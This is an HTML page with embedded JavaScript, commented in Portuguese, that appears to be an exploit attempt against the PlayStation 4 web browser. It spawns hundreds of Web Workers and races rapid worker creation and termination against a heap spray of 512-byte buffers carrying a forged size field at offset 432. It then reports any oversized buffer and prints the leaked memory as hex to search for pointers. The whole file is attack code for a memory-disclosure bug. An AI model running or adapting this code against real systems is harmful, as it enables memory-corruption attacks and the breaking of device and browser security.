<!DOCTYPE html>
<html lang="pt-PT">
<head>
    <meta charset="UTF-8">
    <title>PS4 SIZE SHIFTER (OFFSET 432) 417</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
        h1 { color: #f0f; border-bottom: 2px solid #f0f; display: inline-block; }
        #status { font-size: 1.5em; border: 1px solid #555; padding: 20px; margin: 20px 0; background: #111; }
        #result { font-size: 1.2em; color: #0f0; background: #004; padding: 15px; display: none; text-align: left; white-space: pre-wrap; word-break: break-all; }
        .success { background-color: #050 !important; border: 2px solid #0f0 !important; }
        .try { color: #ff0; }
    </style>
</head>
<body>

    <h1>SIZE SHIFTER (OFFSET 432)</h1>
    <div id="status">A preparar...</div>
    <div id="result"></div>

    <script>
        // CONFIGURAÇÃO
        const TARGET_THREADS = 417; // Usar o valor estável (415-417)
        const SPRAY_SIZE = 512;
        const TARGET_OFFSET = 432; // O offset que causou OOM
        
        let workers = [];
        
        // Worker que apenas recebe mensagens e devolve o tamanho
        const blob = new Blob([`
            onmessage = function(e) {
                // Se recebermos dados, devolvemos o tamanho para o main thread
                // Se o exploit funcionar, este tamanho pode ser maior que 512!
                postMessage({len: e.data.byteLength, data: e.data});
            }
        `], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        
        // Kamikaze para abrir o buraco
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        // Vamos tentar tamanhos ligeiramente maiores que 512
        // Se conseguirmos ler 1024, vazamos o próximo objeto da memória
        const SIZES_TO_TRY = [
            0x400, // 1024 (Tentar ler o dobro)
            0x800, // 2048
            0x1000, // 4096 (1 Página)
            0x2000  // 8192
        ];
        
        let currentSizeIdx = 0;

        function start() {
            document.getElementById('status').innerText = "1. CRIANDO THREADS (415)...";
            
            let i = setInterval(() => {
                if (workers.length < TARGET_THREADS) {
                    const w = new Worker(url);
                    w.onmessage = handleWorkerResponse;
                    workers.push(w);
                } else {
                    clearInterval(i);
                    nextAttempt();
                }
            }, 30);
        }

        function nextAttempt() {
            if(currentSizeIdx >= SIZES_TO_TRY.length) {
                document.getElementById('status').innerText = "Fim dos testes. Nenhuma anomalia detectada.";
                return;
            }
            
            const size = SIZES_TO_TRY[currentSizeIdx];
            document.getElementById('status').innerText = `2. TESTANDO TAMANHO: ${size} (0x${size.toString(16)})...`;
            document.getElementById('status').className = "try";
            
            attack(size);
        }

        function attack(sizeToInject) {
            // Prepara o payload
            const payload = new Uint8Array(SPRAY_SIZE);
            payload.fill(0x00); // Zeros
            
            // Offset 272 e 384: Zeros para não crashar execução
            // Offset 432: O TAMANHO FALSO
            // Escrevemos o tamanho em Little Endian (Int32 ou Int64)
            // Vamos assumir Int32 primeiro
            const view = new DataView(payload.buffer);
            view.setUint32(TARGET_OFFSET, sizeToInject, true); // Little Endian

            // Dispara por 3 segundos
            let count = 0;
            const atk = setInterval(() => {
                const w = new Worker(killerUrl);
                w.terminate();
                try { 
                    if(workers.length > 0) {
                        // Envia Buffer
                        workers[0].postMessage(payload);
                    }
                } catch(e){}
                
                count++;
                if(count > 100) {
                    clearInterval(atk);
                    // Passa para o próximo tamanho após uma pausa
                    setTimeout(() => {
                        currentSizeIdx++;
                        nextAttempt();
                    }, 1000);
                }
            }, 20);
        }

        function handleWorkerResponse(e) {
            const len = e.data.len;
            
            // O normal seria recebermos algo em torno do tamanho do payload (512)
            // Se recebermos MAIS, temos um vazamento!
            if (len > SPRAY_SIZE) {
                document.getElementById('status').innerText = "SUCESSO! VAZAMENTO DETECTADO!";
                document.getElementById('status').className = "success";
                
                let msg = `Tamanho recebido: ${len} bytes (Esperado: ${SPRAY_SIZE})\n`;
                msg += `DADOS VAZADOS:\n`;
                
                // Converte os dados extras para Hex para procurarmos ponteiros
                const bytes = new Uint8Array(e.data.data);
                for(let i=SPRAY_SIZE; i<len && i<SPRAY_SIZE+128; i+=8) { // Mostra os primeiros 128 bytes extras
                     let hex = "";
                     for(let j=0; j<8 && i+j<len; j++) {
                         hex = bytes[i+j].toString(16).padStart(2,'0') + hex;
                     }
                     msg += `Offset +${i}: 0x${hex}\n`;
                }
                
                const res = document.getElementById('result');
                res.style.display = 'block';
                res.innerText = msg;
                
                // Parar tudo! Achámos!
                workers.forEach(w => w.terminate());
                workers = [];
                currentSizeIdx = 999; 
            }
        }

        setTimeout(start, 1000);

    </script>
</body>
</html>


